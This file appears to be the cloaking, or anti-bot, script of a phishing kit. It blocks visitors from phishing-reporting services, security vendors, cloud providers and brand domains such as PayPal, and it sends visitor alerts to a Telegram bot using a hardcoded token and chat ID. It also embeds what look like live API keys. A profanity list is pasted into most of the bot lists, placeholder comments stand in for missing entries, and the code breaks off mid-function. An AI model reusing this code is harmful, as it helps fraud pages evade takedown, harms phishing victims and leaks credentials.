document.addEventListener('DOMContentLoaded', async () => {
    const apiKeys = {
        ipQualityScoreApiKey: 'ihhaMDk24TlN5GSasu6RMDUBduuiYQBZ',
        telegramBotApiToken: '7110620603:AAElY4veGoaUTkqNW_Ew6rxzBII0x4bClGA',
        telegramChatId: '5138839925',
        recaptchaSecretKey: 'YOUR_RECAPTCHA_SECRET_KEY',
        ipinfoApiKey: '1a2482afaa2d71',
        redirectUrl: 'https://example.com'  // Replace with your actual redirect URL
    };

    const badIps = [
        '192.168.1.1', '10.0.0.1', '203.0.113.0', '198.51.100.0', '192.0.2.0',
        '91.200.12.103', '91.200.12.104', '91.200.12.105', '91.200.12.106', '91.200.12.107',
        '91.200.12.108', '91.200.12.109', '91.200.12.110', '91.200.12.111', '91.200.12.112',
        '91.200.12.113', '91.200.12.114', '91.200.12.115', '91.200.12.116', '91.200.12.117',
        '91.200.12.118', '91.200.12.119', '91.200.12.120', '91.200.12.121', '91.200.12.122',
        '91.200.12.123', '91.200.12.124', '91.200.12.125', '91.200.12.126', '91.200.12.127',
        '91.200.12.128', '91.200.12.129', '91.200.12.130', '91.200.12.131', '91.200.12.132',
        '91.200.12.133', '91.200.12.134', '91.200.12.135', '91.200.12.136', '91.200.12.137',
        '91.200.12.138', '91.200.12.139', '91.200.12.140', '91.200.12.141', '91.200.12.142',
        '91.200.12.143', '91.200.12.144', '91.200.12.145', '91.200.12.146', '91.200.12.147',
        '91.200.12.148', '91.200.12.149', '91.200.12.150', '91.200.12.151', '91.200.12.152',
        '91.200.12.153', '91.200.12.154', '91.200.12.155', '91.200.12.156', '91.200.12.157',
        '91.200.12.158', '91.200.12.159', '91.200.12.160', '91.200.12.161', '91.200.12.162',
        '91.200.12.163', '91.200.12.164', '91.200.12.165', '91.200.12.166', '91.200.12.167',
        '91.200.12.168', '91.200.12.169', '91.200.12.170', '91.200.12.171', '91.200.12.172',
        '91.200.12.173', '91.200.12.174', '91.200.12.175', '91.200.12.176', '91.200.12.177',
        '91.200.12.178', '91.200.12.179', '91.200.12.180', '91.200.12.181', '91.200.12.182',
        '91.200.12.183', '91.200.12.184', '91.200.12.185', '91.200.12.186', '91.200.12.187',
        '91.200.12.188', '91.200.12.189', '91.200.12.190', '91.200.12.191', '91.200.12.192',
        '91.200.12.193', '91.200.12.194', '91.200.12.195', '91.200.12.196', '91.200.12.197',
        '91.200.12.198', '91.200.12.199', '91.200.12.200', '91.200.12.201', '91.200.12.202',
        // ... (continue up to 500 entries)
    ];

    const badUserAgents = [
        'BadBot', 'AnotherBadBot', 'Scrapy', 'Python-urllib', 'HttpClient',
        'libwww-perl', 'wget', 'curl', 'fetch', 'Go-http-client',
        'okhttp', 'python-requests', 'lwp-trivial', 'libwww-perl', 'python-requests',
        'phpcrawl', 'PycURL', 'guzzle', 'httpie', 'user-agent',
        'HttpClient', 'bot', 'crawler', 'spider', 'Java',
        'Jakarta', 'MauiBot', 'Dataprovider', 'CCBot', 'LinkWalker',
        'rogerbot', 'AhrefsBot', 'MJ12bot', 'DotBot', 'SeznamBot',
        'seekbot', 'BLEXBot', 'TwengaBot', 'sistrix', 'proximic',
        'screaming', 'yacybot', 'OpenWebSpider', 'PySpider', 'semalt',
        'siteexplorer', 'Domain Re-Animator Bot', 'SearchmetricsBot', 'SputnikBot',
        'YandexImages', 'AdsBot-Google', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
        'Baiduspider-image', 'Baiduspider-video', 'MSNBot-NewsBlogs', 'Facebot', 'ia_archiver',
        'lilith', 'blackWidow', 'Xenu', 'larbin', 'wget', 'CherryPicker',
        'EmailCollector', 'WebBandit', 'Mister', 'Mister PiX', 'Web Image Collector',
        'Pixray', 'DittoSpyder', 'Foobot', 'WebFindBot', 'WebVac',
        'Teleport', 'Teleport Pro', 'WebStripper', 'WebZIP', 'WebWhacker',
        'Siphon', 'GrabNet', 'Harvest', 'GetRight', 'Go!Zilla',
        'WebReaper', 'NetMechanic', 'URL_Spider_Pro', 'CherryPicker', 'LinkScan',
        'HTTrack', 'Microsoft URL Control', 'Python-urllib', 'Web Downloader', 'WebCopier',
        'RealDownload', 'SuperBot', 'WebSucker', 'Vodafone', 'SemrushBot',
        'seznambot', 'facebookexternalhit', 'JikeSpider', 'Linkdexbot', 'twitterbot',
        'Butano', 'NimbleCrawler', 'Sentibot', 'dumbot', 'BotALot',
        'PagePeeker', 'Screaming Frog SEO Spider', 'DeadLinkChecker', 'masscan', 'NetcraftSurveyAgent','ass-fucker', 'addrs', 'asses', 'assfucker', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'bastard', 'bunny fucker',
        'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'dog-fucker',
        'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ',
        'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker',
        'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ',
        'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuker', 'fukker', 'fukkin', 'fux0r', 'f_u_c_k',
        'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers',
        'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked',
        'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks',
        'muff', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'pissing', 'pissoff ', 'porn', 'porno',
        'pornography', 'pornos', 'titfuck', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'scam', 'scammers', 'shit',
        'asshole', 'arsehole', 'passwd', 'sample',
        // ... (continue up to 500 entries)
    ];

    const knownBots = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver',
        'AhrefsBot', 'SemrushBot', 'MJ12bot', 'DotBot', 'SeznamBot',
        'Seekbot', 'BLEXBot', 'TwengaBot', 'Sistrix', 'Proximic',
        'Screaming', 'Yacybot', 'OpenWebSpider', 'PySpider', 'Semalt',
        'SiteExplorer', 'Domain Re-Animator Bot', 'SearchmetricsBot', 'SputnikBot',
        'DuckDuckGo-Favicons-Bot', 'Slackbot-LinkExpanding', 'Qwantify', 'SurveyBot',
        'DataForSeoBot', 'LingueeBot', 'ZoomInfoBot', 'Mediametrics Bot', 'MetaJobBot',
        'HubSpot Marketing Grader', 'PaperLiBot', 'PiplBot', 'Meanpathbot', 'BUbiNG',
        'Barkrowler', 'OpenLinkProfiler.org', 'linkdexbot', 'WeSEE:Search', 'Slackbot',
        'PetalBot', 'Amazonbot', 'CensysInspect', 'Pinterestbot', 'Twitterbot',
        'Scrapy', 'ScreamingFrogSEO', 'spbot', 'PhantomJS', 'Rogerbot',
        'HostHorde', 'ScreenerBot', 'dotbot', 'CrawlDaddy', 'ia_archiver',
        'TurnitinBot', 'archive.org_bot', 'Yahoo! Slurp', 'SearchSpider', 'BecomeBot',
        'WholeWebCrawler', 'heritrix', 'LexiBot', 'EnvolkBot', 'YandexBot',
        'GigaBot', 'larbin', 'Baiduspider', 'Yammybot', 'yacybot',
        'EasouSpider', 'naverbot', 'noxtrumbot', 'proximic', 'findlinks',
        'Blekkobot', 'Twiceler', 'grub-client', 'MetaURI', 'aipbot',
        'larbin', 'Mediapartners-Google', 'psbot', 'KaloogaBot', 'Slackbot',
        'Linkdexbot', 'SISTRIX', 'newsharecounts', 'PiplBot', 'searchmetricsbot',
        'wesee:search', 'ichiro', 'genieo', 'careerbot', 'Wget',
        'grapeshot', 'AhrefsBot', 'MJ12bot', 'DotBot', 'LinkpadBot',
        'BLEXBot', 'meanpathbot', 'Buck', 'adscanner', 'AwarioBot','ass-fucker', 'addrs', 'asses', 'assfucker', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'bastard', 'bunny fucker',
        'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'dog-fucker',
        'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ',
        'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker',
        'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ',
        'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuker', 'fukker', 'fukkin', 'fux0r', 'f_u_c_k',
        'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers',
        'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked',
        'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks',
        'muff', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'pissing', 'pissoff ', 'porn', 'porno',
        'pornography', 'pornos', 'titfuck', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'scam', 'scammers', 'shit',
        'asshole', 'arsehole', 'passwd', 'sample',
        // ... (continue up to 500 entries)
    ];

    const suspiciousIsps = [
        'DigitalOcean', 'OVH SAS', 'Alibaba', 'Hetzner', 'Linode', 'CenturyLink Communications, LLC', 'AS209 CenturyLink Communications, LLC',
        'LeaseWeb', 'Contabo', 'HostGator', 'Microsoft Corporation', 'Amazon.com', 'AS396982 Google LLC', 'Google.com', 'Google', 'AS203999 Geekyworks IT Solutions Pvt Ltd',
        'AS14061 DigitalOcean, LLC', 'AS16509 Amazon.com, Inc.', 'AS14618 Amazon.com, Inc.', 'AS13335 Cloudflare, Inc.', 'AS14593 Space Exploration Technologies Corporation',
        'AS15169 Google LLC', 'AS8075 Microsoft Corporation', 'AS24940 Hetzner Online GmbH', 'AS20473 The Constant Company, LLC', 'AS63949 Linode, LLC',
        'AS46606 Unified Layer', 'AS26496 GoDaddy.com, LLC', 'AS16276 OVH SAS', 'AS8100 QuadraNet Enterprises LLC', 'AS37963 Alibaba.com LLC', 'Geekyworks IT Solutions Pvt Ltd',
        'AS63949 DigitalOcean, LLC', 'AS54641 Bigleaf Networks, Inc.', 'AS62785 GitHub, Inc.', 'AS22612 Namecheap, Inc.', 'AS23470 Rackspace Hosting',
        'AS13354 Verizon Business', 'AS23352 Server Central Network', 'AS18978 Enzu Inc', 'AS137409 Tencent Cloud Computing (Beijing) Co., Ltd.',
        'AS13414 Twitter Inc.', 'AS209242 Hosting Services Inc', 'AS19957 ATT', 'AS33363 Sanity Solutions', 'AS32475 SingleHop LLC', 'AS19710 Dino Solutions, Inc.', 'Dino Solutions, Inc.',
        'AS33363 Hostwinds LLC', 'AS16276 OVH SAS', 'AS16509 Amazon.com, Inc.', 'AS60068 HYVE Ltd', 'AS40065 CNSERVERS LLC', 'AS3502 Intelligence Network Online, Inc',
        'AS27647 Telmex Colombia S.A.', 'AS32590 eNom, Incorporated', 'AS23470 RACKSPACE', 'AS54994 Alibaba', 'AS2635 HG', 'AS394474 WhiteLableColo', 'WhiteLableColo', 'whitelabelcolo', 'AS64200 VIVID-HOSTING LLC',
        'AS26496 GoDaddy.com, LLC', 'AS13414 Twitter Inc.', 'AS20473 The Constant Company, LLC', 'AS137409 Tencent Cloud Computing (Beijing) Co., Ltd.', 'VIVID-HOSTING LLC', 'AS19653 CTS Communications Corp', 'CTS Communications Corp',
        'AS16276 OVH SAS', 'AS33494 Namecheap, Inc.', 'AS19527 Alibaba', 'AS8075 Microsoft Corporation', 'AS33363 Hostwinds LLC', 'AS62874 Web2Objects LLC', 'Web2Objects LLC', 'AS14051 Consolidated Communications Inc', 'Consolidated Communications Inc',
        'AS46606 Unified Layer', 'AS16509 Amazon.com, Inc.', 'AS15169 Google LLC', 'AS15133 Verizon Business', 'AS63949 DigitalOcean, LLC', 'Facebook Inc', 'AS32934 Facebook Inc', 'AS46261 QuickPacket, LLC', 'QuickPacket, LLC',
        'AS16509 Amazon.com, Inc.', 'AS20001 AS-20001', 'AS13354 Verizon Business', 'AS26496 GoDaddy.com, LLC', 'AS23470 Rackspace Hosting',
        'AS30083 Telmex Colombia S.A.', 'AS137409 Tencent Cloud Computing (Beijing) Co., Ltd.', 'AS40065 CNSERVERS LLC', 'AS33363 Hostwinds LLC',
        'AS33363 Sanity Solutions', 'AS8075 Microsoft Corporation', 'AS15169 Google LLC', 'AS16276 OVH SAS', 'AS54641 Bigleaf Networks, Inc.',
        'AS26496 GoDaddy.com, LLC', 'AS20001 AS-20001', 'AS14618 Amazon.com, Inc.', 'AS33363 Hostwinds LLC', 'AS209242 Hosting Services Inc',
        'AS33494 Namecheap, Inc.', 'AS13414 Twitter Inc.', 'AS40065 CNSERVERS LLC', 'AS3356 Level 3 Parent, LLC', 'AS16276 OVH SAS',
        'AS16276 OVH SAS', 'AS26496 GoDaddy.com, LLC', 'AS16509 Amazon.com, Inc.', 'AS33494 Namecheap, Inc.', 'AS15169 Google LLC',
        'AS8075 Microsoft Corporation', 'AS15133 Verizon Business', 'AS13354 Verizon Business', 'AS46606 Unified Layer', 'AS27647 Telmex Colombia S.A.',
        'AS33363 Hostwinds LLC', 'AS37963 Alibaba.com LLC', 'AS63949 DigitalOcean, LLC', 'AS16509 Amazon.com, Inc.', 'AS13335 Cloudflare, Inc.',
        'AS26496 GoDaddy.com, LLC', 'AS15169 Google LLC', 'AS23470 Rackspace Hosting', 'AS8075 Microsoft Corporation', 'AS23470 RACKSPACE',
        'AS8075 Microsoft Corporation', 'AS26496 GoDaddy.com, LLC', 'AS14061 DigitalOcean, LLC', 'AS16509 Amazon.com, Inc.', 'AS33363 Hostwinds LLC',
        'AS15169 Google LLC', 'AS33494 Namecheap, Inc.', 'AS46606 Unified Layer', 'AS40065 CNSERVERS LLC', 'AS54641 Bigleaf Networks, Inc.',
        'AS33363 Sanity Solutions', 'AS20001 AS-20001', 'AS37963 Alibaba.com LLC', 'AS16276 OVH SAS', 'AS60068 HYVE Ltd',
        'AS27647 Telmex Colombia S.A.', 'AS8075 Microsoft Corporation', 'AS14618 Amazon.com, Inc.', 'AS137409 Tencent Cloud Computing (Beijing) Co., Ltd.',
        'AS33363 Hostwinds LLC', 'AS23470 Rackspace Hosting', 'AS20473 The Constant Company, LLC', 'AS13335 Cloudflare, Inc.', 'AS15133 Verizon Business',
        'AS46606 Unified Layer', 'AS32475 SingleHop LLC', 'AS26554 Verizon Business', 'AS20001 AS-20001', 'AS16509 Amazon.com, Inc.',
        'AS26496 GoDaddy.com, LLC', 'AS23470 Rackspace Hosting', 'AS8075 Microsoft Corporation', 'AS8075 Microsoft Corporation', 'AS40065 CNSERVERS LLC',
        'AS20001 AS-20001', 'AS23470 RACKSPACE', 'AS33363 Hostwinds LLC', 'AS16509 Amazon.com, Inc.', 'AS26496 GoDaddy.com, LLC',
        'AS37963 Alibaba.com LLC', 'AS15169 Google LLC', 'AS16509 Amazon.com, Inc.', 'AS15169 Google LLC', 'AS8075 Microsoft Corporation',
        'AS137409 Tencent Cloud Computing (Beijing) Co., Ltd.', 'AS32475 SingleHop LLC', 'AS33363 Hostwinds LLC', 'AS33363 Hostwinds LLC', 'AS54641 Bigleaf Networks, Inc.',
        'AS40065 CNSERVERS LLC', 'AS8075 Microsoft Corporation', 'AS13335 Cloudflare, Inc.', 'AS37963 Alibaba.com LLC', 'AS46606 Unified Layer', 'AS54538 PALO ALTO NETWORKS',
		'AS209 Centurylink Communication', 'AS207990 HostRoyale Technologies Pvt Ltd', 'HostRoyale Technologies Pvt Ltd', 'AS203020 HostRoyale Technologies Pvt Ltd',
        // ... (continue up to 500 entries)
    ];

    const blockedWords = [
        'deltainfocom', 'dnsserverhosting', 'Java/1.6.0_22', 'Go-http-client/1.1', 'drweb', 'Dr.Web', 'hostinger', 'scanurl', 'above', 'level3',
        'level', 'involta', 'SOLUTIONPRO-NET', 'SOLUTION', 'SolutionPro', 'SPRO-NET-206-80-96', 'SPRO-NET-207-70-0', 'SPRO-NET-209-19-128', 'LVLT-STATIC-4-14-16', 'americanexpress',
        'google', 'softlayer', 'amazonaws', 'cyveillance', 'phishtank', 'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 'paypal',
        'facebook', 'ebay', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher', 'NetcraftSurveyAgent', 'Sogou web spider', 'PrintfulBot', 'UnwindFetchor', 'urlresolver',
        'Butterfly', 'TweetmemeBot', 'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms', 'YandexBot', 'SearchmetricsBot', 'picsearch',
        'TweetedTimes Bot', 'QuerySeekerSpider', 'ShowyouBot', 'woriobot', 'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler', 'R6_CommentReader', 'magpie-crawler',
        'GrapeshotCrawler', 'PercolateCrawler', 'MaxPointCrawler', 'R6_FeedFetcher', 'NetSeer crawler', 'grokkit-crawler', 'SMXCrawler', 'PulseCrawler', 'Y!J-BRW', 'datasift',
        '80legs.com/webcrawler', 'Mediapartners-Google', 'Spinn3r', 'InAGist', 'Python-urllib', 'python-requests', 'NING', 'TencentTraveler', 'Feedfetcher-Google', 'mon.itor.us',
        'p3pwgdsn', 'sucuri.net', 'messagelabs', 'torservers', 'trendmicro', 'spbot', 'Feedly', 'bot', 'curl', 'spider',
        'crawler','ass-fucker', 'addrs', 'asses', 'assfucker', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'bastard', 'bunny fucker',
        'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'dog-fucker',
        'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ',
        'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker',
        'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ',
        'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuker', 'fukker', 'fukkin', 'fux0r', 'f_u_c_k',
        'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers',
        'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked',
        'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks',
        'muff', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'pissing', 'pissoff ', 'porn', 'porno',
        'pornography', 'pornos', 'titfuck', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'scam', 'scammers', 'shit',
        'asshole', 'arsehole', 'passwd', 'sample',
        // ... (continue up to 500 entries)
    ];

    const blockedWords2 = [
        'Java/1.6.0_22', 'bot', 'above', 'google', 'softlayer', 'amazonaws', 'cyveillance', 'compatible', 'facebook', 'phishtank',
        'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 'apache-httpclient', 'lssrocketcrawler', 'Trident', 'X11', 'crawler', 'urlredirectresolver',
        'jetbrains', 'spam', 'windows 95', 'windows 98', 'acunetix', 'netsparker', 'google', '007ac9', '008', '192.comagent',
        '200pleasebot', '360spider', '4seohuntbot', '50.nu', 'a6-indexer', 'admantx', 'amznkassocbot', 'aboundexbot', 'aboutusbot', 'abrave spider',
        'accelobot', 'acoonbot', 'addthis.com', 'adsbot-google', 'ahrefsbot', 'alexabot', 'amagit.com', 'analytics', 'antbot', 'apercite',
        'aportworm', 'arabot', 'crawl', 'slurp', 'spider', 'seek', 'accoona', 'acoon', 'adressendeutschland', 'ah-ha.com',
        'ahoy', 'altavista', 'ananzi', 'anthill', 'appie', 'arachnophilia', 'arale', 'araneo', 'aranha', 'architext',
        'aretha', 'arks', 'asterias', 'atlocal', 'atn', 'atomz', 'augurfind', 'backrub', 'bannana_bot', 'baypup',
        'bdfetch', 'big brother', 'biglotron', 'bjaaland', 'blackwidow', 'blaiz', 'blog', 'blo.', 'bloodhound', 'boitho',
        'booch', 'bradley', 'butterfly', 'calif', 'cassandra', 'ccubee', 'cfetch', 'charlotte', 'churl', 'cienciaficcion',
        'cmc', 'collective', 'comagent', 'combine', 'computingsite', 'csci', 'curl', 'cusco', 'daumoa', 'deepindex',
        'delorie', 'depspid', 'deweb', 'die blinde kuh', 'digger', 'ditto', 'dmoz', 'docomo', 'download express', 'dtaagent',
        'dwcp', 'ebiness', 'ebingbong', 'e-collector', 'ejupiter', 'emacs-w3 search engine', 'esther', 'evliya celebi', 'ezresult', 'falcon',
        'felix ide', 'ferret', 'fetchrover', 'fido', 'findlinks', 'fireball', 'fish search', 'fouineur', 'funnelweb', 'gazz',
        'gcreep', 'genieknows', 'getterroboplus', 'geturl', 'glx', 'goforit', 'golem', 'grabber', 'grapnel', 'gralon',
        'griffon', 'gromit', 'grub', 'gulliver', 'hamahakki', 'harvest', 'havindex', 'helix', 'heritrix', 'hku www octopus',
        'homerweb', 'htdig', 'html index', 'html_analyzer', 'htmlgobble', 'hubater', 'hyper-decontextualizer', 'ia_archiver', 'ibm_planetwide', 'ichiro',
        'iconsurf', 'iltrovatore', 'image.kapsi.net', 'imagelock', 'incywincy', 'indexer', 'infobee', 'informant', 'ingrid', 'inktomisearch.com',
        'inspector web', 'intelliagent', 'internet shinchakubin', 'ip3000', 'iron33', 'israeli-search', 'ivia', 'jack', 'jakarta', 'javabee',
        'jetbot', 'jumpstation', 'katipo', 'kdd-explorer', 'kilroy', 'knowledge', 'kototoi', 'kretrieve', 'labelgrabber', 'lachesis',
        'larbin', 'legs', 'libwww', 'linkalarm', 'link validator', 'linkscan', 'lockon', 'lwp', 'lycos', 'magpie',
        'mantraagent', 'mapoftheinternet', 'marvin/', 'mattie', 'mediafox', 'mediapartners', 'mercator', 'merzscope', 'microsoft url control', 'minirank',
        'miva', 'mj12', 'mnogosearch', 'moget', 'monster', 'moose', 'motor', 'multitext', 'muncher', 'muscatferret',
        'mwd.search', 'myweb', 'najdi', 'nameprotect', 'nationaldirectory', 'nazilla', 'ncsa beta', 'nec-meshexplorer', 'nederland.zoek', 'netcarta webmap engine',
        'netmechanic', 'netresearchserver', 'netscoop', 'newscan-online', 'nhse', 'nokia6682/', 'nomad', 'noyona', 'nutch', 'nzexplorer',
        'objectssearch', 'occam', 'omni', 'open text', 'openfind', 'openintelligencedata', 'orb search', 'osis-project', 'pack rat', 'pageboy',
        'pagebull', 'page_verifier', 'panscient', 'parasite', 'partnersite', 'patric', 'pear.', 'pegasus', 'peregrinator', 'pgp key agent',
        'phantom', 'phpdig', 'picosearch', 'piltdownman', 'pimptrain', 'pinpoint', 'pioneer', 'piranha', 'plumtreewebaccessor', 'pogodak',
        'poirot', 'pompos', 'poppelsdorf', 'poppi', 'popular iconoclast', 'psycheclone', 'publisher', 'python', 'rambler', 'raven search',
        'roach', 'road runner', 'roadhouse', 'robbie', 'robofox', 'robozilla', 'rules', 'salty', 'sbider', 'scooter',
        'scoutjet', 'scrubby', 'search.', 'searchprocess', 'semanticdiscovery', 'senrigan', 'sg-scout', 'shai\'hulud', 'shark', 'shopwiki',
        'sidewinder', 'sift', 'silk', 'simmany', 'site searcher', 'site valet', 'sitetech-rover', 'skymob.com', 'sleek', 'smartwit',
        'sna-', 'snappy', 'snooper', 'sohu', 'speedfind', 'sphere', 'sphider', 'spinner', 'spyder', 'steeler/',
        'suke', 'suntek', 'supersnooper', 'surfnomore', 'sven', 'sygol', 'szukacz', 'tach black widow', 'tarantula', 'templeton',
        '/teoma', 't-h-u-n-d-e-r-s-t-o-n-e', 'theophrastus', 'titan', 'titin', 'tkwww', 'toutatis', 't-rex', 'tutorgig', 'twiceler',
        'twisted', 'ucsd', 'udmsearch', 'url check', 'updated', 'vagabondo', 'valkyrie', 'verticrawl', 'victoria', 'vision-search',
        'volcano', 'voyager/', 'voyager-hc', 'w3c_validator', 'w3m2', 'w3mir', 'walker', 'wallpaper', 'wanderer', 'wauuu',
        'wavefire', 'web core', 'web hopper', 'web wombat', 'webbandit', 'webcatcher', 'webcopy', 'webfoot', 'weblayers', 'weblinker',
        'weblog monitor', 'webmirror', 'webmonkey', 'webquest', 'webreaper', 'websitepulse', 'websnarf', 'webstolperer', 'webvac', 'webwalk',
        'webwatch', 'webwombat', 'webzinger', 'wget', 'whizbang', 'whowhere', 'wild ferret', 'worldlight', 'wwwc', 'wwwster',
        'xenu', 'xift', 'xirq', 'yandex', 'yanga', 'yeti', 'yahoo!', 'FreeBSD', 'msnbot', 'YahooSeeker',
        'bingbot', 'facebookexternalhit', 'ubuntu','ass-fucker', 'addrs', 'asses', 'assfucker', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'bastard', 'bunny fucker',
        'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'dog-fucker',
        'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ',
        'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker',
        'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ',
        'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuker', 'fukker', 'fukkin', 'fux0r', 'f_u_c_k',
        'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers',
        'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked',
        'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks',
        'muff', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'pissing', 'pissoff ', 'porn', 'porno',
        'pornography', 'pornos', 'titfuck', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'scam', 'scammers', 'shit',
        'asshole', 'arsehole', 'passwd', 'sample',
        // ... (continue up to 500 entries)
    ];

    const abusiveWords = [
        'ass-fucker', 'addrs', 'asses', 'assfucker', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'bastard', 'bunny fucker',
        'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'dog-fucker',
        'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ',
        'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker',
        'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ',
        'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuker', 'fukker', 'fukkin', 'fux0r', 'f_u_c_k',
        'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers',
        'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked',
        'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks',
        'muff', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'pissing', 'pissoff ', 'porn', 'porno',
        'pornography', 'pornos', 'titfuck', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'scam', 'scammers', 'shit',
        'asshole', 'arsehole', 'passwd', 'sample',
        // ... (continue up to 500 entries)
    ];

    const httpRefererChecks = [
        { referer: 'phishtank.com', message: '[ Phishtank ]' },
        { referer: 'www.phishtank.com', message: '[ Phishtank ]' },
		{ referer: 'phishtank.org', message: '[ Phishtank ]' },
		{ referer: 'www.phishtank.org', message: '[ Phishtank ]' },
        // Add more referer checks if needed
    ];

    const ipRangeCheck = [
        { start: '146.112.0.0', end: '146.112.255.255', message: '[ Blacklist ]' },
        // Add more IP ranges if needed
    ];

    function ipInRange(ip, range) {
        const ipNum = ipToLong(ip);
        const startNum = ipToLong(range.start);
        const endNum = ipToLong(range.end);
        return ipNum >= startNum && ipNum <= endNum;
    }

    function ipToLong(ip) {
        const parts = ip.split('.').map(Number);
        return ((parts[0] * 256 + parts[1]) * 256 + parts[2]) * 256 + parts[3];
    }

    async function sendTelegramAlert(message) {
        const telegramApiUrl = `https://api.telegram.org/bot${apiKeys.telegramBotApiToken}/sendMessage`;
        const params = { chat_id: apiKeys.telegramChatId, text: message };
        try {
            await fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(params)
            });
        } catch (error) {
            console.error('Error sending Telegram alert:', error);
        }
    }

    async function checkIP() {
        const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
        const userAgent = navigator.userAgent;
        const referer = document.referrer;

        // Fetch detailed IP info
